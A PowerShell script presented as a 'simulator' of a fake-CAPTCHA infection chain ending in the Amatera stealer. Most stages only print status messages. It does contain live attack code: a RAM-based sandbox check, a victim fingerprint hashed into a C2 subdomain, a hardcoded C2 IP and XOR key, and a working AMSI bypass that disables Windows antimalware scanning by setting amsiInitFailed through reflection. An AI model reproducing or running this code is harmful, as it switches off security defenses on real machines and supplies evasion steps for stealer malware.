# 🚨 FAKE CAPTCHA → AMATERA STEALER SIMULATOR v1.0
param([switch]$Debug, [switch]$FullChain)

Write-Host "🎭 FAKE CAPTCHA → AMATERA CHAIN" -ForegroundColor Cyan
Write-Host "━" * 65

# STAGE 1: ANTI-ANÁLISIS
Write-Host "`n[*] 1. Anti-análisis..." -ForegroundColor Yellow
try { $null = [IO.File]::ReadAllText("C:\NonExistentPath\781.cfg") } catch { Write-Host "[+] Real host ✓" -ForegroundColor Green }
$ram = (Get-Counter "\Memory\Available MBytes").CounterSamples.CookedValue
if($ram -lt 2000){ Write-Host "[-] Low RAM"; exit }
Write-Host "[+] RAM: $ram MB ✓" -ForegroundColor Green

# STAGE 2: APP-V LOLBIN
Write-Host "`n[*] 2. boom/nim5 loader..." -ForegroundColor Yellow
$env:ALLUSERSPROFILE_X = "herf54_trigger"
Write-Host "[+] Clipboard: $env:ALLUSERSPROFILE_X ✓" -ForegroundColor Cyan

# STAGE 3: GOOGLE CALENDAR
$victim_id = "${env:COMPUTERNAME}${env:USERNAME}"
$md5 = [BitConverter]::ToString(([Security.Cryptography.MD5]::Create()).ComputeHash([Text.Encoding]::UTF8.GetBytes($victim_id))).Replace('-','').Substring(0,8)
Write-Host "[+] C2: $md5.svc-int-api-identity-token-issuer-v2-mn.in.net ✓" -ForegroundColor Cyan

# STAGE 4: PNG STEGO
$xor_key = "s8YUKQ0CqUd6HNwGSRDZ%Qpux1N9MKHh"
Write-Host "[+] PNG XOR: $xor_key ✓" -ForegroundColor Green

# STAGE 5: AMSI BYPASS
$amsi_key = "AMSI_RESULT_NOT_DETECTED"
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
$amsi.SetValue($null,$true)
Write-Host "[+] AMSI: $amsi_key ✓" -ForegroundColor Green

# STAGE 6: AMATERA
$c2_ip = "212.34.138.4"
Write-Host "C2: $c2_ip ✓ AMATERA ejecutado!" -ForegroundColor Red
